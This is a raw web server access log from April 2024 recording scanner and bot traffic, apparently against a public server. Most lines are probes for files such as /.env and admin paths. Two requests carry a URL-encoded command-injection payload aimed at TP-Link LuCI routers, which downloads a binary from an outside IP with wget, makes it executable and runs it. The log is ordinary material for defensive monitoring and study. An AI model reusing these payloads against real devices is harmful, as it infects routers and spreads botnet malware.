83.97.73.245 - - [19/Apr/2024:15:44:40 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
69.164.217.74 - - [19/Apr/2024:15:57:51 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.251 - - [19/Apr/2024:15:58:30 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
143.110.222.166 - - [19/Apr/2024:16:00:30 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.190.218 - - [19/Apr/2024:16:23:07 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
54.37.79.75 - - [19/Apr/2024:16:31:53 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [19/Apr/2024:16:31:53 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
83.97.73.245 - - [19/Apr/2024:16:57:00 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [19/Apr/2024:17:12:18 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
45.79.168.172 - - [19/Apr/2024:17:32:19 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 zgrab/0.x"
45.79.172.21 - - [19/Apr/2024:17:32:31 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
5.181.190.250 - - [19/Apr/2024:17:46:04 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1" 500 803 "-" "Go-http-client/1.1"
143.110.222.166 - - [19/Apr/2024:18:02:50 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
45.115.225.71 - - [25/Apr/2024:18:24:29 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.1"
57.129.23.166 - - [25/Apr/2024:18:28:27 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [25/Apr/2024:18:28:28 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.196.34 - - [25/Apr/2024:18:49:19 +0000] "GET /manager/html HTTP/1.1" 500 803 "-" "Mozilla/5.0 zgrab/0.x"
59.178.21.192 - - [25/Apr/2024:18:50:12 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
167.94.138.56 - - [25/Apr/2024:18:51:20 +0000] "GET / HTTP/1.1" 500 803 "-" "-"
167.94.138.56 - - [25/Apr/2024:18:51:27 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
143.110.222.166 - - [25/Apr/2024:19:10:52 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
57.129.23.166 - - [25/Apr/2024:19:58:18 +0000] "GET /.env HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [25/Apr/2024:19:58:19 +0000] "POST / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [25/Apr/2024:19:59:49 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
